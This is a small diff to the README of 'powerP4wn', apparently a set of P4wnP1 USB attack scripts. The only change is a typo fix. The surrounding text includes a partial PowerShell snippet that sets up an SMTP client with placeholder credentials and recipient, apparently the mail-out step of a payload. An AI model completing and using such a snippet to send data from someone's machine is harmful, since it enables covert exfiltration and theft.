@@ -1,6 +1,6 @@
 # powerP4wn
 P4wnP1 scripts that actually work
-trfm....this is the manual
+RTFM....this is the manual
 
 
 >>>>>New-Object Net.Mail.SmtpClient("smtpserver",25);$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential("emailaccountcreds","emailaccountpsswd");$d=New-Object System.Net.Mail.MailMessage;$d.From="senderemail";$d.To.Add("recieveremail")
